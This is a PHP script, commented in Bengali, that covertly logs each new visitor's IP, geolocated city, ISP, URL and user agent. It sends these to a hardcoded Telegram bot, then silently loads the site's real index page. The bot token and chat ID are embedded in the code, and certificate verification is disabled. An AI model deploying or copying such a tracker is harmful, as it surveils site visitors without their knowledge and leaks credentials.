<?php
/**
 * Telegram Domain Notifier — লোকেশনসহ
 */

// ---- আপনার Telegram Bot Credentials ----
$bot_token = '8322253449:AAH4edgb7h4v9U0dfuFfFdJk4wdtyH5m0K0';
$chat_id   = '7011426446';
// -----------------------------------------

$cache_file = __DIR__ . '/.visited_cache';
$ip         = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$domain     = $_SERVER['HTTP_HOST'];

// IP লোকেশন বের করি (ip-api.com — ফ্রি, প্রতি IP ১ বার/মিনিট)
$location = '';
$loc_data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,org,query");

if ($loc_data) {
    $loc = json_decode($loc_data, true);
    if ($loc && $loc['status'] === 'success') {
        $city     = $loc['city'] ?? 'Unknown';
        $region   = $loc['regionName'] ?? 'Unknown';
        $country  = $loc['country'] ?? 'Unknown';
        $isp      = $loc['isp'] ?? 'N/A';
        $location = "{$city}, {$region}, {$country}";
    }
}

// IP ক্যাশে চেক
$already_notified = false;
if (file_exists($cache_file)) {
    $cached_ips = file($cache_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $cached_ips)) {
        $already_notified = true;
    }
}

if (!$already_notified) {
    $protocol   = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
                  || $_SERVER['SERVER_PORT'] == 443 ? 'https' : 'http';
    $full_url   = $protocol . '://' . $domain . $_SERVER['REQUEST_URI'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    $message = "🔔 *নতুন ভিজিটর — রুট ডোমেইন!*\n\n"
             . "🌐 *ডোমেইন:* $domain\n"
             . "🔗 *লিংক:* $full_url\n"
             . "📍 *লোকেশন:* $location\n"
             . "📌 *IP:* $ip\n"
             . "🏢 *ISP:* $isp\n"
             . "🕒 *সময়:* " . date('Y-m-d H:i:s') . "\n"
             . "🧑‍💻 *UA:* `$user_agent`";

    $telegram_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data = [
        'chat_id'                  => $chat_id,
        'text'                     => $message,
        'parse_mode'               => 'Markdown',
        'disable_web_page_preview' => true,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);

    file_put_contents($cache_file, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// মূল সাইট লোড
$index_file = '';
if (file_exists(__DIR__ . '/index.php')) {
    $index_file = '/index.php';
} elseif (file_exists(__DIR__ . '/index.html')) {
    $index_file = '/index.html';
} elseif (file_exists(__DIR__ . '/index.htm')) {
    $index_file = '/index.htm';
}

if ($index_file) {
    include __DIR__ . $index_file;
} else {
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><title>OK</title></head><body>';
    echo '<h1>সাইটটি সচল আছে</h1>';
    echo '</body></html>';
}